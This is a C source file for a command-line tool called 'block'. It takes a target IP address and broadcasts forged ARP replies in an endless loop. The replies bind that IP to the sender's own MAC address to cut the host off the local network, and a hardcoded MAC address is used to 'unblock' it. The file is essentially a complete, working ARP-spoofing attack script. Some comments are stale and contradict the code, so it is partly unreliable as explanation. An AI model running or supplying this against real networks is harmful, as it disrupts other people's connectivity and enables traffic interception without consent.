// run as sudo ./block 172.30.104.234 1 //argv[1] is the ip to block or unblock // argv[2] =1 for unblock and 0 for block
// Send an IPv4 ARP packet via raw socket at the link layer (ethernet frame).
// Values set for ARP request.
 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>           // close()
#include <string.h>           // strcpy, memset(), and memcpy()
 
#include <netdb.h>            // struct addrinfo
#include <sys/types.h>        // needed for socket(), uint8_t, uint16_t
#include <sys/socket.h>       // needed for socket()
#include <netinet/in.h>       // IPPROTO_RAW, INET_ADDRSTRLEN
#include <netinet/ip.h>       // IP_MAXPACKET (which is 65535)
#include <arpa/inet.h>        // inet_pton() and inet_ntop()
#include <sys/ioctl.h>        // macro ioctl is defined
#include <bits/ioctls.h>      // defines values for argument "request" of ioctl.
#include <net/if.h>           // struct ifreq
#include <linux/if_ether.h>   // ETH_P_ARP = 0x0806
#include <linux/if_packet.h>  // struct sockaddr_ll (see man 7 packet)
#include <net/ethernet.h>
 
#include <errno.h>            // errno, perror()
 
// Define a struct for ARP header
typedef struct _arp_hdr arp_hdr;
struct _arp_hdr {
  uint16_t htype;
  uint16_t ptype;
  uint8_t hlen;
  uint8_t plen;
  uint16_t opcode;
  uint8_t sender_mac[6];
  uint8_t sender_ip[4];
  uint8_t target_mac[6];
  uint8_t target_ip[4];
};
 
// Define some constants.
#define ETH_HDRLEN 14      // Ethernet header length
#define IP4_HDRLEN 20      // IPv4 header length
#define ARP_HDRLEN 28      // ARP header length
#define ARPOP_REQUEST 1    // Taken from <linux/if_arp.h>
#define ARPOP_REPLY 2 

// Function prototypes
char *allocate_strmem (int);
uint8_t *allocate_ustrmem (int);
 
int
main (int argc, char **argv)
{
  int i, status, frame_length, sd, bytes;
  char *interface, *target, *src_ip;
  arp_hdr arphdr;
	arp_hdr *arphdr1;
  uint8_t *src_mac, *dst_mac, *ether_frame;
  struct addrinfo hints, *res;
  struct sockaddr_in *ipv4;
  struct sockaddr_ll device;
  struct ifreq ifr;
 
  // Allocate memory for various arrays.
  src_mac = allocate_ustrmem (6);
  dst_mac = allocate_ustrmem (6);
  ether_frame = allocate_ustrmem (IP_MAXPACKET);
  interface = allocate_strmem (40);
  target = allocate_strmem (40);
  src_ip = allocate_strmem (INET_ADDRSTRLEN);
 
  // Interface to send packet through.
  strcpy (interface, "wlp2s0");
 
  // Submit request for a socket descriptor to look up interface.
  if ((sd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
    perror ("socket() failed to get socket descriptor for using ioctl() ");
    exit (EXIT_FAILURE);
  }
 
  // Use ioctl() to look up interface name and get its MAC address.
  memset (&ifr, 0, sizeof (ifr));
  snprintf (ifr.ifr_name, sizeof (ifr.ifr_name), "%s", interface);
  if (ioctl (sd, SIOCGIFHWADDR, &ifr) < 0) {
    perror ("ioctl() failed to get source MAC address ");
    return (EXIT_FAILURE);
  }
  close (sd);
 
  // Copy source MAC address.
  																																							//---------------------------SOURCE MAC-------------------
	// memset (src_mac, 0, 6 * sizeof (uint8_t));
	if(atoi(argv[2])==1)																														// 1 for Unblock
	{
 	src_mac[0]=0x28;
	src_mac[1]=0xf1;
	src_mac[2]=0x0e;
	src_mac[3]=0x3a;
	src_mac[4]=0xd4;
	src_mac[5]=0x42;
	}
	if(atoi(argv[2])==0)																														//0 for block	
	{
	memcpy (src_mac, ifr.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
	}

  // Report source MAC address to stdout.
  printf ("MAC address for interface %s is ", interface);
  for (i=0; i<5; i++) {
    printf ("%02x:", src_mac[i]);
  }
  printf ("%02x\n", src_mac[5]);
 
  // Find interface index from interface name and store index in
  // struct sockaddr_ll device, which will be used as an argument of sendto().
  memset (&device, 0, sizeof (device));
  if ((device.sll_ifindex = if_nametoindex (interface)) == 0) {
    perror ("if_nametoindex() failed to obtain interface index ");
    exit (EXIT_FAILURE);
  }
  printf ("Index for interface %s is %i\n", interface, device.sll_ifindex);
 
  // Set destination MAC address: broadcast address
  memset (dst_mac, 0xff, 6 * sizeof (uint8_t));				//------------------------DEST MAC----------------------
 
  // Source IPv4 address:  you need to fill this out
  strcpy (src_ip, argv[1]);									//----------------------------SOURCE IP-----------------------
 
  // Destination URL or IPv4 address (must be a link-local node): you need to fill this out

  strcpy (target, "172.20.79.255");															//----------------------TARGET IP---------------------------------
 
  // Fill out hints for getaddrinfo().
  memset (&hints, 0, sizeof (struct addrinfo));
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags = hints.ai_flags | AI_CANONNAME;
 
  // Source IP address
  if ((status = inet_pton (AF_INET, src_ip, &arphdr.sender_ip)) != 1) //--------------------------ARP_HDR SENDER IP-------------------------
  {
    fprintf (stderr, "inet_pton() failed for source IP address.\nError message: %s", strerror (status));
    exit (EXIT_FAILURE);
  }
 
  // Resolve target using getaddrinfo().
  if ((status = getaddrinfo (target, NULL, &hints, &res)) != 0) {
    fprintf (stderr, "getaddrinfo() failed: %s\n", gai_strerror (status));
    exit (EXIT_FAILURE);
  }
  ipv4 = (struct sockaddr_in *) res->ai_addr;
  memcpy (&arphdr.target_ip, &ipv4->sin_addr, 4 * sizeof (uint8_t)); //---------------------------ARP_HDR TARGET IP--------------------
  freeaddrinfo (res);
 
  // Fill out sockaddr_ll.
  device.sll_family = AF_PACKET;
  memcpy (device.sll_addr, src_mac, 6 * sizeof (uint8_t));
  device.sll_halen = 6;
 
  // ARP header
 
  // Hardware type (16 bits): 1 for ethernet
  arphdr.htype = htons (1);
 
  // Protocol type (16 bits): 2048 for IP
  arphdr.ptype = htons (ETH_P_IP);
 
  // Hardware address length (8 bits): 6 bytes for MAC address
  arphdr.hlen = 6;
 
  // Protocol address length (8 bits): 4 bytes for IPv4 address
  arphdr.plen = 4;
 
  // OpCode: 1 for ARP request
  arphdr.opcode = htons (ARPOP_REPLY);
 
  // Sender hardware address (48 bits): MAC address------------------------------------------ARP_HDR SOURCE MAC-------------------
  memcpy (&arphdr.sender_mac, src_mac, 6 * sizeof (uint8_t));
 
  // Sender protocol address (32 bits)
  // See getaddrinfo() resolution of src_ip.
 
  // Target hardware address (48 bits): zero, since we don't know it yet.--------------------ARP_HDR TARGET MAC--------------------
  //memset (&arphdr.target_mac, 0, 6 * sizeof (uint8_t));
 	arphdr.target_mac[0]=0xff;
	arphdr.target_mac[1]=0xff;
	arphdr.target_mac[2]=0xff;
	arphdr.target_mac[3]=0xff;
	arphdr.target_mac[4]=0xff;
	arphdr.target_mac[5]=0xff;

  // Target protocol address (32 bits)
  // See getaddrinfo() resolution of target.
 
  // Fill out ethernet frame header.
 
  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)
  frame_length = 6 + 6 + 2 + ARP_HDRLEN;
 
  // Destination and Source MAC addresses
  memcpy (ether_frame, dst_mac, 6 * sizeof (uint8_t));
  memcpy (ether_frame + 6, src_mac, 6 * sizeof (uint8_t));
 
  // Next is ethernet type code (ETH_P_ARP for ARP).
  ether_frame[12] = ETH_P_ARP / 256;
  ether_frame[13] = ETH_P_ARP % 256;
 
  // Next is ethernet frame data (ARP header).
 
  // ARP header
  memcpy (ether_frame + ETH_HDRLEN, &arphdr, ARP_HDRLEN * sizeof (uint8_t));
 
  // Submit request for a raw socket descriptor.
  if ((sd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
    perror ("socket() failed ");
    exit (EXIT_FAILURE);
  }
 
  // Send ethernet frame to socket.
	while(1)
{
  if ((bytes = sendto (sd, ether_frame, frame_length, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
    perror ("sendto() failed");
    exit (EXIT_FAILURE);
  }
}
	/*arphdr1 = (arp_hdr *) (ether_frame + 6 + 6 + 2);
  while (((((ether_frame[12]) << 8) + ether_frame[13]) != ETH_P_ARP) || (ntohs (arphdr1->opcode) != ARPOP_REPLY)) {
    if ((status = recv (sd, ether_frame, IP_MAXPACKET, 0)) < 0) {
      if (errno == EINTR) {
        memset (ether_frame, 0, IP_MAXPACKET * sizeof (uint8_t));
        continue;  // Something weird happened, but let's try again.
      } else {
        perror ("recv() failed:");
        exit (EXIT_FAILURE);
      }
    }
  }
  close (sd);
 
  // Print out contents of received ethernet frame.
  printf ("\nEthernet frame header:\n");
  printf ("Destination MAC (this node): ");
  for (i=0; i<5; i++) {
    printf ("%02x:", ether_frame[i]);
  }
  printf ("%02x\n", ether_frame[5]);
  printf ("Source MAC: ");
  for (i=0; i<5; i++) {
    printf ("%02x:", ether_frame[i+6]);
  }
  printf ("%02x\n", ether_frame[11]);
  // Next is ethernet type code (ETH_P_ARP for ARP).
  printf ("Ethernet type code (2054 = ARP): %u\n", ((ether_frame[12]) << 8) + ether_frame[13]);
  printf ("\nEthernet data (ARP header):\n");
  printf ("Hardware type (1 = ethernet (10 Mb)): %u\n", ntohs (arphdr1->htype));
  printf ("Protocol type (2048 for IPv4 addresses): %u\n", ntohs (arphdr1->ptype));
  printf ("Hardware (MAC) address length (bytes): %u\n", arphdr1->hlen);
  printf ("Protocol (IPv4) address length (bytes): %u\n", arphdr1->plen);
  printf ("Opcode (2 = ARP reply): %u\n", ntohs (arphdr1->opcode));
  printf ("Sender hardware (MAC) address: ");
  for (i=0; i<5; i++) {
    printf ("%02x:", arphdr1->sender_mac[i]);
  }
  printf ("%02x\n", arphdr1->sender_mac[5]);
  printf ("Sender protocol (IPv4) address: %u.%u.%u.%u\n",
    arphdr1->sender_ip[0], arphdr1->sender_ip[1], arphdr1->sender_ip[2], arphdr1->sender_ip[3]);
  printf ("Target (this node) hardware (MAC) address: ");
  for (i=0; i<5; i++) {
    printf ("%02x:", arphdr1->target_mac[i]);
  }
  printf ("%02x\n", arphdr1->target_mac[5]);
  printf ("Target (this node) protocol (IPv4) address: %u.%u.%u.%u\n",
    arphdr1->target_ip[0], arphdr1->target_ip[1], arphdr1->target_ip[2], arphdr1->target_ip[3]);*/
 
 
  // Close socket descriptor.
  close (sd);
 
  // Free allocated memory.
  free (src_mac);
  free (dst_mac);
  free (ether_frame);
  free (interface);
  free (target);
  free (src_ip);
 
  return (EXIT_SUCCESS);
}
 
// Allocate memory for an array of chars.
char *
allocate_strmem (int len)
{
  void *tmp;
 
  if (len <= 0) {
    fprintf (stderr, "ERROR: Cannot allocate memory because len = %i in allocate_strmem().\n", len);
    exit (EXIT_FAILURE);
  }
 
  tmp = (char *) malloc (len * sizeof (char));
  if (tmp != NULL) {
    memset (tmp, 0, len * sizeof (char));
    return (tmp);
  } else {
    fprintf (stderr, "ERROR: Cannot allocate memory for array allocate_strmem().\n");
    exit (EXIT_FAILURE);
  }
}
 
// Allocate memory for an array of unsigned chars.
uint8_t *
allocate_ustrmem (int len)
{
  void *tmp;
 
  if (len <= 0) {
    fprintf (stderr, "ERROR: Cannot allocate memory because len = %i in allocate_ustrmem().\n", len);
    exit (EXIT_FAILURE);
  }
 
  tmp = (uint8_t *) malloc (len * sizeof (uint8_t));
  if (tmp != NULL) {
    memset (tmp, 0, len * sizeof (uint8_t));
    return (tmp);
  } else {
    fprintf (stderr, "ERROR: Cannot allocate memory for array allocate_ustrmem().\n");
    exit (EXIT_FAILURE);
  }
}
